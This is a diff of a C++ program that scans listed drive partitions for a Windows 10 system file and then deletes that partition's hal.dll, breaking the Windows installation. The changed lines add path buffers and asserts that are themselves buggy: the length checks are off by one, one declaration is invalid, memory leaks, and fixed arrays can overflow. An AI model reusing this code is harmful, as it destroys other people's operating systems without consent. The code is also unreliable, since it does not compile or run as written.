@@ -116,7 +116,7 @@ void DeleteIf(bool cond, const char* path) {
     if (IsUserSystem(program, path))
       remove(path);
 
-   switch (program) {
+    switch (program) {
       case User: printf("Running has User\n");
       break;
       case Admin: printf("Running has Admin\n");
@@ -135,24 +135,28 @@ void MountedSearch() {
   FILE* drive_list = fopen("drive_list", "r");
   assert(drive_list != nullptr);
 
-  char drive[256];
-  char source[256];
-  char name[256];
-  char del[256];
+  char drive[16];  // /dev/sda1
+  char source[32]; // /c
+  //char name[256];   // /c/Windows/System32/D3D12.dll
+  //char del[256];    // /c/Windows/System32/hal.dll
 
   while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
     printf("Drive %s mounted in: %s\n", drive, source);
     if (strcmp(source, "/") == 0) strcpy(source, "\0");
+    char* name = new char[strlen(source) + 28];
     strcpy(name, source);
     strcat(name, "/Windows/System32/D3D12.dll");
     printf("Looking for file: %s\n", name);
+	assert(strlen(name) == strlen(source) + 28);///////////////
 
-    struct stat buffer;
+    stat buffer; // struct???
     if (stat(name, &buffer) == 0) {
       printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
+      char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
       printf("Deleting %s ...\n", del);
+	  assert(strlen(del) == strlen(source) + 26);//////////////////
       remove(del);
     }
     printf("\n");
@@ -170,10 +174,10 @@ void UnmountedSearch() {
   FILE* drive_list = fopen("drive_list", "r");
   assert(drive_list != nullptr);
 
-  char drive[256];
-  char source[256];
-  char name[256];
-  char del[256];
+  char drive[16];
+  char source[32];
+  //char name[256];
+  //char del[256];
 
   while (fscanf(drive_list, "%s\n", drive) == 1) {
     printf("Unmounted drive found in: %s\n", drive);
@@ -200,15 +204,20 @@ void UnmountedSearch() {
     source[length - 1] = '\0';
     printf("Drive %s mounted in: %s\n", drive, source);
 
+    char* name = new char[strlen(source) + 28];
     strcpy(name, source);
     strcat(name, "/Windows/System32/D3D12.dll");
     printf("Looking for file: %s\n", name);
-    struct stat buffer;
+	assert(strlen(name) == strlen(source) + 28);///////////////
+
+    stat buffer;
     if (stat(name, &buffer) == 0) {
       printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
+	  char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
       printf("Deleting %s ...\n", del);
+	  assert(strlen(del) == strlen(source) + 26);//////////////////
       remove(del);
     }
     printf("\n");
